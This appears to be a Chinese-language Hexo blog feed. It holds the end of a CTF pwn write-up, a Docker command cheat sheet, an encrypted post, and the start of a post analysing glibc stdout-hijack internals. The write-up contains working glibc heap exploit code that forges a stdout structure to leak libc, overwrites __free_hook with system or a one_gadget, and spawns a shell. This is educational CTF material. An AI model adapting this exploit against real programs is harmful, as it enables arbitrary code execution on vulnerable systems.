<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tcachebins</span><br><span class="line">0x60 [  2]: 0x55555555bad0 —▸ 0x7ffff7fc1be0 —▸ 0x55555555bd40 ◂— ...</span><br><span class="line">0x100 [  7]: 0x55555555b2a0 —▸ 0x55555555b3a0 —▸ 0x55555555b4a0 —▸ 0x55555555b5a0 —▸ 0x55555555b6a0 —▸ 0x55555555b7a0 —▸ 0x55555555b8a0 ◂— 0</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x55555555bac0 —▸ 0x7ffff7fc1be0 ◂— 0x55555555bac0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<h3 id="hijack-stdout"><a href="#hijack-stdout" class="headerlink" title="hijack stdout"></a>hijack stdout</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># # 4. 测试, 爆破 _IO_2_1_stdout_ 的地址，成功概率 1/16</span></span><br><span class="line"><span class="comment"># # pwndbg&gt; p &amp;_IO_2_1_stdout_</span></span><br><span class="line"><span class="comment"># # $1 = (struct _IO_FILE_plus *) 0x7ffff7fc26a0 &lt;_IO_2_1_stdout_&gt;</span></span><br><span class="line"><span class="comment"># 由于会 sprintf 会追加 &#x27;\x00&#x27;, 这里用后面的 read</span></span><br><span class="line"><span class="comment">#edit(12, b&#x27;%p&#x27;*0x11+b&#x27;1&#x27;*10, b&#x27;\x00&#x27;)</span></span><br><span class="line">edit(<span class="number">12</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xa5</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">8</span>, <span class="string">b&#x27;11111&#x27;</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x58</span>+<span class="string">b&#x27;\x90\x26&#x27;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">add(<span class="number">13</span>, <span class="number">0x50</span>)</span><br><span class="line">add(<span class="number">14</span>, <span class="number">0x50</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">14</span>, <span class="string">b&#x27;\xff&#x27;</span>*<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span> + p32(<span class="number">0xfbad1800</span>) + <span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x25</span>-<span class="number">8</span>))</span><br><span class="line">r(<span class="number">8</span>)</span><br><span class="line">data = uu64(r(<span class="number">6</span>))</span><br><span class="line">leak(<span class="string">&#x27;data&#x27;</span>,data)</span><br><span class="line">libc_base = data - <span class="number">0x1ec980</span></span><br><span class="line">leak(<span class="string">&quot;libc_base&quot;</span>,libc_base)</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">one = [<span class="number">0xe3afe</span>, <span class="number">0xe3b01</span>, <span class="number">0xe3b04</span>]</span><br><span class="line">one_gadget = libc_base + one[<span class="number">1</span>]</span><br><span class="line">leak(<span class="string">&quot;free_hook&quot;</span>,free_hook)</span><br><span class="line">leak(<span class="string">&quot;system_addr&quot;</span>,system_addr)</span><br><span class="line">leak(<span class="string">&quot;one_gadget&quot;</span>,one_gadget)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里为什么是0xa5？</p>
<p>这里的0xa5恰好可以将下面的chunk8的old_chunk_size覆盖为一个不大不小的数 0x0000006161616161 太大了会出问题(如果全覆盖的话read好像字节数太多了读取不了)</p>
<p>会导致这里的\x90\x26无法写入</p>
<p>需要把chunk8的人工size填充为一个大小合理的值，否则太大了read读取不了，太小了又不够覆盖</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">12</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xa5</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>篡改了chunk 8的old_chunk_size，是他可以直接写入大量数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">8</span>, <span class="string">b&#x27;11111&#x27;</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x58</span>+<span class="string">b&#x27;\x90\x26&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>这个是改了chunk 9的next指针低位，使它概率指向 stdout - 0x10 的地方</p>
<p>申请出 stdout - 0x10 的地方，改 stdout 的<code>_flag</code>为 0xfbad1800，和 write_base_ptr 的低位为 00，实现泄露出libc地址</p>
<h3 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 5.getshell</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span>+ p64(free_hook-<span class="number">0x10</span>), <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(one_gadget),<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">itr()</span><br><span class="line"><span class="comment">####################</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;1&#x27;</span>*<span class="number">0x50</span>+p64(free_hook-<span class="number">0x10</span>), <span class="string">b&#x27;*&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, <span class="string">b&#x27;1&#x27;</span>*<span class="number">0x10</span> + p64(system_addr), <span class="string">b&#x27;*&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;1&#x27;</span>*<span class="number">0x50</span> + <span class="string">b&#x27;/bin/sh\x00&#x27;</span>, <span class="string">b&#x27;*&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>用上前面申请的0x40的3个 chunk 改 free_hook 为 one_gadget 或改 free_hook 为 system_addr 来 get shell</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>unlink还可以这样用，有点类似house of botcake…</p>
<h1 id="prompt"><a href="#prompt" class="headerlink" title="prompt"></a>prompt</h1><h1 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h1><ol>
<li><a href="https://blog.csdn.net/a19106051385/article/details/146318753">https://blog.csdn.net/a19106051385/article/details/146318753</a></li>
<li><a href="https://mp.weixin.qq.com/s/0e8avtn3o_jZJbh3UDUdzw">https://mp.weixin.qq.com/s/0e8avtn3o_jZJbh3UDUdzw</a></li>
<li><a href="https://mp.weixin.qq.com/s/Ygg4bm9y27vskWyxFR2vOw">https://mp.weixin.qq.com/s/Ygg4bm9y27vskWyxFR2vOw</a></li>
<li><a href="https://blog.csdn.net/XiDPPython/article/details/146384414">https://blog.csdn.net/XiDPPython/article/details/146384414</a></li>
</ol>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>docker常用命令</title>
    <url>/2025/07/16/docker%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<p>好的，没问题！这是一份为您精心整理的 Docker 常用命令大全，按照功能进行了分类，并附上了最常用的选项和示例。您可以把它当作一个速查手册。</p>
<h3 id="一、-镜像管理-Image-Management"><a href="#一、-镜像管理-Image-Management" class="headerlink" title="一、 镜像管理 (Image Management)"></a>一、 镜像管理 (Image Management)</h3><p>镜像是创建容器的基础。</p>
<table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">描述</th>
<th align="left">示例</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>docker pull</code></td>
<td align="left">从 Docker Hub 或其他镜像仓库拉取一个镜像</td>
<td align="left"><code>docker pull nginx:latest</code></td>
</tr>
<tr>
<td align="left"><code>docker images</code></td>
<td align="left">列出本地已经下载的所有镜像</td>
<td align="left"><code>docker images</code></td>
</tr>
<tr>
<td align="left"><code>docker rmi</code></td>
<td align="left">删除一个或多个本地镜像</td>
<td align="left"><code>docker rmi ubuntu:18.04</code></td>
</tr>
<tr>
<td align="left"><code>docker rmi -f</code></td>
<td align="left">强制删除一个镜像（即使有容器在使用它）</td>
<td align="left"><code>docker rmi -f my-image</code></td>
</tr>
<tr>
<td align="left"><code>docker build</code></td>
<td align="left">从 Dockerfile 构建一个新镜像</td>
<td align="left"><code>docker build -t my-app:1.0 .</code></td>
</tr>
<tr>
<td align="left"><code>docker history</code></td>
<td align="left">查看镜像的构建历史（各层信息）</td>
<td align="left"><code>docker history nginx</code></td>
</tr>
<tr>
<td align="left"><code>docker save</code></td>
<td align="left">将一个镜像保存成 tar 归档文件</td>
<td align="left"><code>docker save -o nginx.tar nginx:latest</code></td>
</tr>
<tr>
<td align="left"><code>docker load</code></td>
<td align="left">从 tar 归档文件加载一个镜像</td>
<td align="left"><code>docker load -i nginx.tar</code></td>
</tr>
</tbody></table>
<hr>
<h3 id="二、-容器生命周期-Container-Lifecycle"><a href="#二、-容器生命周期-Container-Lifecycle" class="headerlink" title="二、 容器生命周期 (Container Lifecycle)"></a>二、 容器生命周期 (Container Lifecycle)</h3><p>容器是镜像的运行实例。</p>
<table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">描述</th>
<th align="left">示例</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>docker run</code></td>
<td align="left">基于一个镜像创建并启动一个新容器</td>
<td align="left"><code>docker run -d -p 8080:80 --name my-web nginx</code></td>
</tr>
<tr>
<td align="left"><code>docker ps</code></td>
<td align="left">列出所有<strong>正在运行</strong>的容器</td>
<td align="left"><code>docker ps</code></td>
</tr>
<tr>
<td align="left"><code>docker ps -a</code></td>
<td align="left">列出<strong>所有</strong>的容器（包括已停止的）</td>
<td align="left"><code>docker ps -a</code></td>
</tr>
<tr>
<td align="left"><code>docker stop</code></td>
<td align="left">优雅地停止一个正在运行的容器（发送 SIGTERM）</td>
<td align="left"><code>docker stop my-web</code></td>
</tr>
<tr>
<td align="left"><code>docker kill</code></td>
<td align="left">强制停止一个正在运行的容器（发送 SIGKILL）</td>
<td align="left"><code>docker kill my-web</code></td>
</tr>
<tr>
<td align="left"><code>docker start</code></td>
<td align="left">启动一个已经停止的容器</td>
<td align="left"><code>docker start my-web</code></td>
</tr>
<tr>
<td align="left"><code>docker restart</code></td>
<td align="left">重启一个容器</td>
<td align="left"><code>docker restart my-web</code></td>
</tr>
<tr>
<td align="left"><code>docker rm</code></td>
<td align="left">删除一个或多个<strong>已停止</strong>的容器</td>
<td align="left"><code>docker rm my-web</code></td>
</tr>
<tr>
<td align="left"><code>docker rm -f</code></td>
<td align="left">强制删除一个容器（即使它在运行中）</td>
<td align="left"><code>docker rm -f my-web</code></td>
</tr>
</tbody></table>
<h4 id="docker-run-的常用选项："><a href="#docker-run-的常用选项：" class="headerlink" title="docker run 的常用选项："></a><code>docker run</code> 的常用选项：</h4><ul>
<li><code>-d</code> (<code>--detach</code>): 后台运行容器（守护式运行）。</li>
<li><code>-p</code> (<code>--publish</code>): 端口映射，格式为 <code>主机端口:容器端口</code>。</li>
<li><code>-v</code> (<code>--volume</code>): 数据卷挂载，格式为 <code>主机路径:容器路径</code>。</li>
<li><code>--name</code>: 为容器指定一个易于记忆的名称。</li>
<li><code>-it</code> (<code>--interactive --tty</code>): 以交互模式进入容器的终端。</li>
<li><code>--rm</code>: 容器退出时自动删除容器，适合临时任务。</li>
</ul>
<hr>
<h3 id="三、-容器操作与监控-Container-Operations"><a href="#三、-容器操作与监控-Container-Operations" class="headerlink" title="三、 容器操作与监控 (Container Operations)"></a>三、 容器操作与监控 (Container Operations)</h3><p>管理和查看正在运行的容器。</p>
<table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">描述</th>
<th align="left">示例</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>docker exec</code></td>
<td align="left">在一个正在运行的容器内部执行命令</td>
<td align="left"><code>docker exec -it my-web /bin/bash</code></td>
</tr>
<tr>
<td align="left"><code>docker logs</code></td>
<td align="left">查看容器的日志输出</td>
<td align="left"><code>docker logs my-web</code></td>
</tr>
<tr>
<td align="left"><code>docker logs -f</code></td>
<td align="left">实时跟踪查看容器的日志（类似 <code>tail -f</code>）</td>
<td align="left"><code>docker logs -f my-web</code></td>
</tr>
<tr>
<td align="left"><code>docker inspect</code></td>
<td align="left">查看容器&#x2F;镜像的底层详细信息（如 IP 地址）</td>
<td align="left"><code>docker inspect my-web</code></td>
</tr>
<tr>
<td align="left"><code>docker stats</code></td>
<td align="left">实时显示容器的资源使用情况（CPU, 内存等）</td>
<td align="left"><code>docker stats</code></td>
</tr>
<tr>
<td align="left"><code>docker cp</code></td>
<td align="left">在主机和容器之间复制文件或文件夹</td>
<td align="left"><code>docker cp ./index.html my-web:/usr/share/nginx/html/</code></td>
</tr>
</tbody></table>
<hr>
<h3 id="四、-系统清理-System-Cleanup"><a href="#四、-系统清理-System-Cleanup" class="headerlink" title="四、 系统清理 (System Cleanup)"></a>四、 系统清理 (System Cleanup)</h3><p>清理不再使用的 Docker 资源，释放磁盘空间。</p>
<table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>docker system prune</code></td>
<td align="left"><strong>一键清理！</strong> 删除所有已停止的容器、悬空镜像、不用的网络和构建缓存。</td>
</tr>
<tr>
<td align="left"><code>docker system prune -a</code></td>
<td align="left"><strong>更彻底！</strong> 在<code>prune</code>基础上，额外删除所有未被任何容器使用的镜像。</td>
</tr>
<tr>
<td align="left"><code>docker rm $(docker ps -a -q)</code></td>
<td align="left"><strong>手动清理：</strong> 删除所有容器（无论状态）。</td>
</tr>
<tr>
<td align="left"><code>docker rmi $(docker images -q)</code></td>
<td align="left"><strong>手动清理：</strong> 删除所有本地镜像（请谨慎！）。</td>
</tr>
</tbody></table>
<p><strong>⚠️ 警告：</strong> 清理命令是破坏性的，执行前请三思。</p>
<hr>
<h3 id="五、-Docker-Compose-多容器应用"><a href="#五、-Docker-Compose-多容器应用" class="headerlink" title="五、 Docker Compose (多容器应用)"></a>五、 Docker Compose (多容器应用)</h3><p>用于定义和运行多容器 Docker 应用程序的工具。通常所有配置都在 <code>docker-compose.yml</code> 文件中。</p>
<table>
<thead>
<tr>
<th align="left">命令</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>docker-compose up</code></td>
<td align="left">根据 <code>docker-compose.yml</code> 创建并启动所有服务（前台运行）。</td>
</tr>
<tr>
<td align="left"><code>docker-compose up -d</code></td>
<td align="left">在后台创建并启动所有服务。</td>
</tr>
<tr>
<td align="left"><code>docker-compose down</code></td>
<td align="left">停止并删除由 <code>up</code> 创建的容器、网络。</td>
</tr>
<tr>
<td align="left"><code>docker-compose down -v</code></td>
<td align="left">在 <code>down</code> 的基础上，同时删除定义的数据卷。</td>
</tr>
<tr>
<td align="left"><code>docker-compose ps</code></td>
<td align="left">列出 Compose 项目中的所有容器。</td>
</tr>
<tr>
<td align="left"><code>docker-compose logs</code></td>
<td align="left">查看所有服务的日志。</td>
</tr>
<tr>
<td align="left"><code>docker-compose logs -f</code></td>
<td align="left">实时跟踪所有服务的日志。</td>
</tr>
<tr>
<td align="left"><code>docker-compose build</code></td>
<td align="left">构建或重新构建项目中的服务镜像。</td>
</tr>
<tr>
<td align="left"><code>docker-compose exec</code></td>
<td align="left">进入某个正在运行的服务容器内部。<code>docker-compose exec web /bin/bash</code></td>
</tr>
</tbody></table>
<p>希望这份清单能对您有所帮助！</p>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2025/03/21/hello-world/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="565033cfbad0e25dd85edd49a3af67852a1a453d8356448553781d12c92411de">4630436162ade97ba2718b7d0c4b3b63f97fe7f487088031e1ec7f30c37889e17af4f6297068ec459b8609dd5e773f884c55009995b4e2fa14cd0ad5eff0ada9f9fb8fb348a39322f64a27b4e67198e9d0918355853825b4a8b859e1b0997d0838db13d93eb663a75abf26151a4cd6693bc3399e41eef6d4a0d8ac518bee9c9ddee4d733ecfde4f1c7c01610b2139c3f919d321e3580e4ea4d25333a1eb6a757138158c91746eb650d2bd292b639e6c34cbf144f87d98390fac9f8662146f06c3a6438c2b9ee94e1d311e783b3870047c72629be8369de61aafcfd95d1a6b146908a00176e823191858046b0d3068b0efa543f002c4411ac17d84cfbc5419db7d33e0dec60d5febc26877845ea4a0c78edbec57ec484cb94f4a5981b779247299a083552613550cf2067f03e18806e1d8b7363322598e505c747f93d1e38576db45e8de5d1770b452a4fb1219a730e7968e9f6fbb48dd64088b4f6b768d41ae0fde1188c840a5b26f4bcf87fc459371861bccf009fd56466bfb6189998e9e6a70ba3621ca8bdf949e5cadcc118f51f12983682d54b3fadc89599f99b3bc97b0ac705b13416a1e530d1e06e17469a74ffce4af1c9c1c3a7fe2e7d43f0a4553f309b55a680d4ba0eff5e1480ff40e6cca6cf09c8d0ab9d3d27139e5f1fa8ce760b2b398ec79fa2325ce353708b5fd4928897ec368d0027fa2da6b5a0fd8e4e9b7529ca09bebcdd4ee3a67b8793bf535765eccd25777435299c4f7eaac3b37aa14cd4e771f0d59050e41a2121cab03ed0afccb01338cfaa270444513ab17731861d2e4818cce309b9ff34abf619216411da184092968ba15dba46fd74305d671fcc251530f5b9827fa2b99f113bdb279c693dd1704ca3a9977b3cf3a9ef9e6e9aea7a55f4fc6fc7431430f1e9e124491e51c5a917d50a11cab0f41057afdd9d73a5b69b54cc67bafaa65d40dd533efc909c87f1c18ae04764a239ce69c0e6b19cc5ed2e7a78ac3ef08cb10b1f5b175a7d09c35fb03134919f9a86758fdb28838be1fac5331cdfa5707833518ca071974ca46fbdbf334145555a36a006404440d8fca60195baebf5d921d9ae64c6ede24c1ac47d7b3df82c3ce65f2f997606186ef07a3f88a8a3c72c8e7356c6e5c164a313008c552320c7cc95166d8e5e707dd2c9dbffb129a9ff70ff8101f09fb70b81f2e64efb235bd7a1a44978559875515a83368f1936fdc556832492ae0671d7b67a6d1103441d906adf08a33a54f41e0e0a81c7b4eac704aaa6c35e18d6dc5e7c207f526d5892197d5ec7c4dc0edc9efb23891b524cebecd0ce984f13642004ae7f4f54a08732b3ecd632161bc17cb1fd597809352045d72809c36c4bbd110a7497cabcf294feeb4d11fa9232188bee2584a68dfd88207a7cd9a48503570676e50847d192a2a6e7a3e53b1288974ea16d0d80073c728e0d84755ce47c943e600c17df7a43d591f7b8468bbefe1285a930632e3cc5655a628782afed132fd2656813b3e22325b3a48436551b12b4bb838771f30eb825dcd8fc754fd10a17f9662286af92f4f8894097e941fe3dbb4831cdbc6b443b1824d50b470da2542da6d87fa03706ed8a14dae9ea9870c7981bf761c813f8db6283e5e4d6f83a5a745ead7855a07cee619cc695b70f3df8b4b82f85ae49a93e0a2e86cb14d6e0f39d7f7bf03c28c6ca9e5390facd1c25ec8a080b42009a9e8e7a2661422d70a39b106406ace53b39d9f03ff1dc17e689135109c611b983c2627adbe1cf664ccb70961af510424ea592895cada1f8c387464a798fa7bccbf6c1194aee98de463a3b9d2dd218e14e3ae7e5d0c5f245cc7346d6e77b8485834290c726ad9b51e466d596aa6f3eda026257f794e43169d555593a6a2edff432c8fee45925e7e160535894a5c8cd682d47da0d6c0d453b6aabb3506802282bee599e6b9b05b39711c44af4661449bc4a5f0a6210b62bf1d925fa4ddd6119bf701a01d5697aca71cada1e1589a0292809eefc99ecf7cdfb7fdf6c58755e4056d96a320cf900212ea371469d77092e46fc449dfa62c7e239cba7cc11a68b343416c661aacab9576053516ad64f6d814c2ccc5e0f884262177421fc187ad171106677e25362053b1dfaf3886dc8836429ab3c84fd6e513de9ae09c0fa33f26d020910e61cf24436a5449543f2cd87c83075d5b6196c0906d9803c75158f3f735c9d5e676bff754f1624524fb3bb6ff74c7bc4efa5232f511f6b0101311503ca3f1f1e2d8896d2bba030c5ce2bfbe55caa42dc943bd894d3b4cb477545f75789e0319ffe57729a98b855a9714508a955c8320a1f26393e1f113062535a766a0467a50c0c9d56bc170e68453c016a231eb5723e8470065d0671efc61360e68506bf08024106b9f7ab456d894dfaf5b0a9b20c29411fbb86373522ac2d8c249cbb43844704009da10719c877b42ea5b0f29a1c857a6010f87cf67a5b6c17e7a692e14343826fdfcba7224f82ad67ab76ee82d6e6c764b155358cfcf2b474558e5368b62028c52c55ea61eff706ae8509a86649d409e3a033fffe63429d8f088985c99c2c574c6c8a8ee48f56d84a1bfbbc48250191029b02c8391e05a23f339dd8727457b77b17b9762d6a4f22a369776bfd3f185a9edcdab5b76017d1488457094eed536638b8565385fcab698c2e89b3ebcf1c5aafd80a54f225949b54174b691c1039aa90305bc2538c92411df088b15d3429a841fbe37b3372015181f4a30a3c1bc6e85539c4bd5a692da38b9e05aa69a2640ca4191cf46eb460bc72f5e6a03d98c5e5703e1971e237f10feca4fd1d6720a6631929b4150e2a1f24df54dfc3b94d0321be2001ddf5b8a7bc71b76e677157fe63fdf0e273af4dca56b9e3aba86fd2f893d1dc0c3ac64663868c19d50e6213033a6b4fac6dfbed7e3a01223421aa246a83db479a938f691c533a975b92477ed639b3aa7ace2b93f6402c6d8fc63504e5f383e07929e10a7839d1a9d17330a2883e68592eaba9a66f7ecf4d7c9778380a9acd2dbbaac5f6ded1f384077269489201d58495f66e6c2e14d6939fd0b56382986631a1b9eaefadce7cf27a8999bb34f675b5806d3c4ee96604468043783c027fa96f06ef3ec165fde40bd102c8</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>hijack_stdout</title>
    <url>/2025/03/27/hijack_stdout/</url>
    <content><![CDATA[<p>在glibc_heap的利用中，很可能会遇到没有show功能的程序，从而泄露不了地址，我们可以通过控制stdio，在通过puts等io操作输出之内的函数泄露libc地址</p>
<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><h3 id="IO-puts"><a href="#IO-puts" class="headerlink" title="_IO_puts()"></a>_IO_puts()</h3><p>首先我们看puts()函数的源代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_puts (<span class="type">const</span> <span class="type">char</span> *str)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = EOF;</span><br><span class="line">  _IO_size_t len = <span class="built_in">strlen</span> (str);</span><br><span class="line">  _IO_acquire_lock (_IO_stdout);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((_IO_vtable_offset (_IO_stdout) != <span class="number">0</span></span><br><span class="line">       || _IO_fwide (_IO_stdout, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">      &amp;&amp; _IO_sputn (_IO_stdout, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (<span class="string">&#x27;\n&#x27;</span>, _IO_stdout) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  _IO_release_lock (_IO_stdout);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们要关注的是<code>_IO_sputn</code>，因为只有它调用了<code>str</code>参数，跳转到定义</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)</span></span><br></pre></td></tr></table></figure>

<p>AI的解释：</p>
<p>在glibc中，<code>#define _IO_sputn(__fp, __s, __n)</code>是一个宏定义，它的作用是将一个函数或操作的调用转换为另一个函数或操作的调用。在这个宏中，<code>_IO_XSPUTN</code>是实际执行操作的函数，<code>__fp</code>、<code>__s</code> 和 <code>__n</code> 是传递给该函数的参数。</p>
<p>具体来说，这个宏的定义可以被分解为以下几点：</p>
<ol>
<li><p><strong>宏定义</strong>：<code>#define</code>是C语言中的宏定义指令，用于定义一个宏。这个宏在预处理阶段会被展开。</p>
</li>
<li><p><strong>参数</strong>：<code>__fp</code>、<code>__s</code>和<code>__n</code>是这个宏接受的三个参数：</p>
<ul>
<li><code>__fp</code>：通常是一个指向文件流的指针（<code>FILE *</code>），表示要写入的目标文件流。</li>
<li><code>__s</code>：通常是一个指向字符数组的指针，表示要写入的数据。</li>
<li><code>__n</code>：表示要写入的字符数。</li>
</ul>
</li>
<li><p><strong>展开</strong>：当在代码中调用<code>_IO_sputn(fp, s, n)</code>时，预处理器会将其展开为<code>_IO_XSPUTN(fp, s, n)</code>，从而调用<code>_IO_XSPUTN</code>函数。</p>
</li>
</ol>
<p><code>_IO_XSPUTN</code>通常是一个更底层的实现，用于处理输出到文件流的具体细节。它可能会处理缓冲、字符编码等。</p>
<p>假设你在代码中有如下调用：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_sputn(fp, buffer, size);</span><br></pre></td></tr></table></figure>

<p>在预处理阶段，这将被转换为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_XSPUTN(fp, buffer, size);</span><br></pre></td></tr></table></figure>

<p>这样，实际的输出操作将由<code>_IO_XSPUTN</code>函数执行，而<code>_IO_sputn</code>宏提供了一个更高级的接口。</p>
<p><strong>总结</strong></p>
<p><code>_IO_sputn</code>宏用于将对输出操作的高级抽象映射到底层实现，便于代码的维护和可读性，同时也可能涉及到优化和条件编译等特性。</p>
<p>这也就说明了这个<code>_IO_putn(__fp, __s, __n)</code>是一个虚表函数（网上好多是这样说的），虽然<code>#define _IO_sputn(__fp, __s, __n) _IO_XSPUTN(__fp, __s, __n)</code>本身是一个宏定义，并不涉及C++的虚表机制，但可以通过理解多态性来认识它的作用和设计理念。在C++中，宏可以简化接口，同时背后可能调用一些更为复杂的底层实现，类似于如何通过虚表和虚函数来实现动态绑定。这种设计使得代码更加灵活和可维护。</p>
<hr>
<h3 id="IO-new-file-xsputn"><a href="#IO-new-file-xsputn" class="headerlink" title="_IO_new_file_xsputn()"></a>_IO_new_file_xsputn()</h3><p>这个<code>_IO_sputn()</code>最终调用的是<code>_IO_new_file_xsputn(</code>)函数，在glibc&#x2F;libio&#x2F;fileops.c&#x2F;1200行左右，这里我们要关注的是<code>_IO_OVERFLOW()</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_IO_size_t</span><br><span class="line">_IO_new_file_xsputn (_IO_FILE *f, <span class="type">const</span> <span class="type">void</span> *data, _IO_size_t n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">const</span> <span class="type">char</span> *) data;</span><br><span class="line">  _IO_size_t to_do = n;</span><br><span class="line">  <span class="type">int</span> must_flush = <span class="number">0</span>;</span><br><span class="line">  _IO_size_t count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* This is an optimized implementation.</span></span><br><span class="line"><span class="comment">     If the amount to be written straddles a block boundary</span></span><br><span class="line"><span class="comment">     (or the filebuf is unbuffered), use sys_write directly. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First figure out how much space is available in the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">      <span class="keyword">if</span> (count &gt;= n)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">const</span> <span class="type">char</span> *p;</span><br><span class="line">	  <span class="keyword">for</span> (p = s + n; p &gt; s; )</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">		  count = p - s + <span class="number">1</span>;</span><br><span class="line">		  must_flush = <span class="number">1</span>;</span><br><span class="line">		  <span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line">	